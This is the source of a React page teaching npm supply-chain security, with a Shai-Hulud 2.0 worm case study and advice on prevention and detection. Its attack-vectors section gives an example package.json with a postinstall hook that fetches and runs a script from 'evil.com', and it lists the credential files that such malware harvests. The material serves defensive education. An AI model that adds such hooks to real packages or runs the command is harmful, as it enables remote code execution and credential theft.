'use client';

import { useState } from 'react';
import { Shield, AlertTriangle, BookOpen, Terminal, Lock, Eye, GitBranch, Package } from 'lucide-react';
import Navigation from '@/components/Navigation';
import { ContentData } from '@/types/education';

export default function EducationPage() {
  const [activeTab, setActiveTab] = useState('overview');

  const tabs = [
    { id: 'overview', label: 'Overview', icon: BookOpen },
    { id: 'attack-vectors', label: 'Attack Vectors', icon: AlertTriangle },
    { id: 'prevention', label: 'Prevention', icon: Shield },
    { id: 'detection', label: 'Detection', icon: Eye },
    { id: 'case-study', label: 'Case Study', icon: Terminal }
  ];

  const content: ContentData = {
    overview: {
      title: 'Supply Chain Security Overview',
      sections: [
        {
          title: 'What is Software Supply Chain Security?',
          content: 'Software supply chain security refers to the practices and technologies used to protect the integrity, authenticity, and security of software components, dependencies, and infrastructure throughout the development lifecycle.',
          points: [
            'Dependency management and vulnerability scanning',
            'Code signing and verification',
            'Secure build and deployment processes',
            'Continuous monitoring and threat detection'
          ]
        },
        {
          title: 'Why It Matters',
          content: 'Modern applications rely on hundreds or thousands of third-party packages. A single compromised dependency can affect millions of applications and their users.',
          points: [
            'Average web application uses 1,000+ dependencies',
            '90% of code in modern applications comes from third-party libraries',
            'Single vulnerability can cascade across entire ecosystem'
          ]
        },
        {
          title: 'The Threat Landscape',
          content: 'Attackers increasingly target the software supply chain because it provides high-impact, low-effort attack vectors.',
          points: [
            'Typosquatting and dependency confusion attacks',
            'Compromised maintainer accounts',
            'Malicious package uploads',
            'CI/CD pipeline infiltration'
          ]
        }
      ]
    },
    'attack-vectors': {
      title: 'Common Attack Vectors',
      sections: [
        {
          title: 'The Infection Cycle',
          content: 'The complete lifecycle of the Shai-Hulud 2.0 worm.',
          points: [
            '1. Infection - Malware runs via "preinstall" script',
            '2. Theft & Backdoor - Steals secrets & installs "SHA1HULUD" GitHub Runner',
            '3. Exfiltration - Secrets pushed to public GitHub repos',
            '4. Propagation - Uses stolen tokens to publish new infected packages (Worm)'
          ]
        },
        {
          title: 'Preinstall/Postinstall Scripts',
          content: 'NPM packages can execute arbitrary code during installation through lifecycle scripts.',
          code: `{
  "scripts": {
    "preinstall": "node malicious.js",
    "postinstall": "curl evil.com/steal.sh | bash"
  }
}`,
          points: [
            'Executes automatically during npm install',
            'Runs with user permissions',
            'Can access environment variables and files',
            'Often overlooked in security reviews'
          ]
        },
        {
          title: 'Credential Harvesting',
          content: 'Malware specifically targets development credentials and secrets.',
          points: [
            'Scans ~/.aws/credentials, ~/.azure/, ~/.gccloud/',
            'Searches for API keys in environment variables',
            'Extracts NPM tokens and GitHub PATs',
            'Targets CI/CD runner credentials'
          ]
        },
        {
          title: 'Cross-Victim Exfiltration',
          content: 'Advanced attacks use stolen credentials to exfiltrate data to unrelated repositories.',
          points: [
            'Victim A\'s secrets uploaded to Victim B\'s repository',
            'Complicates attribution and response',
            'Creates data privacy nightmares',
            'Exploits public repository permissions'
          ]
        }
      ]
    },
    prevention: {
      title: 'Prevention Strategies',
      sections: [
        {
          title: 'Package Management Best Practices',
          content: 'Implement strict controls over package installation and updates.',
          points: [
            'Use package lock files (package-lock.json)',
            'Pin dependencies to specific versions',
            'Regularly audit dependencies with npm audit',
            'Implement private package registries for critical packages'
          ]
        },
        {
          title: 'CI/CD Security Hardening',
          content: 'Secure your build and deployment pipelines against supply chain attacks.',
          points: [
            'Disable or restrict lifecycle scripts in CI/CD',
            'Use ephemeral build environments',
            'Implement least-privilege service accounts',
            'Scan all artifacts before deployment'
          ]
        },
        {
          title: 'Developer Security Training',
          content: 'Educate developers about supply chain risks and secure coding practices.',
          points: [
            'Recognize typosquatting attacks',
            'Verify package authenticity before installation',
            'Use security-focused development practices',
            'Report suspicious packages immediately'
          ]
        }
      ]
    },
    detection: {
      title: 'Detection and Monitoring',
      sections: [
        {
          title: 'Real-time Monitoring',
          content: 'Implement continuous monitoring of your software supply chain.',
          points: [
            'Monitor NPM registry for new package versions',
            'Track dependency changes and updates',
            'Alert on unusual installation patterns',
            'Monitor for suspicious network connections'
          ]
        },
        {
          title: 'Behavioral Analysis',
          content: 'Detect anomalies in package and build behavior.',
          points: [
            'Unusual file system access patterns',
            'Unexpected network connections',
            'Credential access attempts',
            'Process creation anomalies'
          ]
        },
        {
          title: 'Forensic Investigation',
          content: 'Tools and techniques for investigating suspected compromises.',
          points: [
            'Package hash verification',
            'Code analysis and reverse engineering',
            'Log analysis and timeline reconstruction',
            'Impact assessment and containment'
          ]
        }
      ]
    },
    'case-study': {
      title: 'Shai-Hulud 2.0 Case Study',
      sections: [
        {
          title: 'Attack Timeline',
          content: 'Chronology of the Shai-Hulud 2.0 supply chain attack.',
          timeline: [
            'Nov 21, 2025: First malicious packages published',
            'Nov 22, 2025: Widespread infection begins',
            'Nov 23, 2025: Cross-victim exfiltration detected',
            'Nov 24, 2025: GitHub begins repository cleanup',
            'Nov 25, 2025: Second phase attacks observed'
          ]
        },
        {
          title: 'Technical Analysis',
          content: 'Deep dive into the malware mechanics and propagation methods.',
          points: [
            'Preinstall script execution for immediate infection',
            'Registers "SHA1HULUD" Self-Hosted Runner for persistence',
            'Sophisticated credential harvesting (TruffleHog)',
            'Automated worm-like propagation via stolen npm tokens'
          ]
        },
        {
          title: 'Impact Assessment',
          content: 'The scale and scope of the attack.',
          points: [
            '25,000+ repositories compromised',
            '700+ malicious packages published',
            'Major packages affected (Postman, Zapier, AsyncAPI)',
            'Estimated millions of developers affected'
          ]
        }
      ]
    }
  };

  const currentContent = content[activeTab as keyof typeof content];

  return (
    <div className="min-h-screen bg-black text-red-50 selection:bg-red-900 selection:text-white">
      <Navigation />

      {/* Header */}
      <header className="border-b border-red-900/50 bg-[#0a0a0a]">
        <div className="max-w-6xl mx-auto px-6 py-6">
          <div className="flex items-center gap-3 mb-4">
            <BookOpen className="w-6 h-6 text-blue-500" />
            <h1 className="text-3xl font-bold text-white">Supply Chain Security Education</h1>
          </div>
          <p className="text-gray-400">
            Learn about supply chain attacks, prevention strategies, and best practices for securing your development lifecycle.
          </p>
        </div>
      </header>

      {/* Navigation Tabs */}
      <div className="border-b border-gray-800 bg-[#050505]">
        <div className="max-w-6xl mx-auto px-6">
          <div className="flex space-x-1 overflow-x-auto">
            {tabs.map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-3 text-sm font-medium transition-colors whitespace-nowrap ${activeTab === tab.id
                    ? 'text-blue-500 border-b-2 border-blue-500 bg-blue-900/10'
                    : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
                  }`}
              >
                <tab.icon className="w-4 h-4" />
                {tab.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Content */}
      <main className="max-w-6xl mx-auto px-6 py-8">
        <div className="space-y-8">
          {currentContent.sections.map((section, index) => (
            <section key={index} className="bg-[#0a0a0a] border border-gray-800 rounded-sm p-6">
              <h2 className="text-2xl font-bold text-white mb-4 flex items-center gap-2">
                {index === 0 && <Terminal className="w-6 h-6 text-blue-500" />}
                {index === 1 && <AlertTriangle className="w-6 h-6 text-blue-500" />}
                {index === 2 && <Lock className="w-6 h-6 text-blue-500" />}
                {section.title}
              </h2>

              <p className="text-gray-300 mb-6 leading-relaxed">{section.content}</p>

              {section.code && (
                <div className="bg-black border border-gray-700 rounded-sm p-4 mb-6 font-mono text-sm">
                  <pre className="text-green-400">{section.code}</pre>
                </div>
              )}

              {section.timeline && (
                <div className="space-y-3 mb-6">
                  {section.timeline.map((item: string, idx: number) => (
                    <div key={idx} className="flex items-start gap-3">
                      <div className="w-2 h-2 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                      <span className="text-gray-300">{item}</span>
                    </div>
                  ))}
                </div>
              )}

              {section.points && (
                <div className="space-y-3">
                  {section.points.map((point, idx) => (
                    <div key={idx} className="flex items-start gap-3">
                      <div className="w-2 h-2 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                      <span className="text-gray-300">{point}</span>
                    </div>
                  ))}
                </div>
              )}
            </section>
          ))}

          {/* Quick Actions */}
          <section className="bg-[#0a0a0a] border border-gray-800 rounded-sm p-6">
            <h2 className="text-2xl font-bold text-white mb-4 flex items-center gap-2">
              <Shield className="w-6 h-6 text-blue-500" />
              Analysis Instructions
            </h2>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <button className="bg-blue-900/20 border border-blue-500/30 p-4 hover:border-blue-500 transition-colors">
                <Package className="w-6 h-6 text-blue-400 mb-2" />
                <h3 className="font-bold text-white mb-1">Upload SBOM</h3>
                <p className="text-xs text-gray-400">Analyze your package-lock.json file</p>
              </button>

              <button className="bg-blue-900/20 border border-blue-500/30 p-4 hover:border-blue-500 transition-colors">
                <GitBranch className="w-6 h-6 text-blue-400 mb-2" />
                <h3 className="font-bold text-white mb-1">Composite Search</h3>
                <p className="text-xs text-gray-400">Use semantic + full-text search</p>
              </button>

              <button className="bg-blue-900/20 border border-blue-500/30 p-4 hover:border-blue-500 transition-colors">
                <Lock className="w-6 h-6 text-blue-400 mb-2" />
                <h3 className="font-bold text-white mb-1">Local Embeddings</h3>
                <p className="text-xs text-gray-400">Generate embeddings locally</p>
              </button>
            </div>
          </section>
        </div>
      </main>
    </div>
  );
}
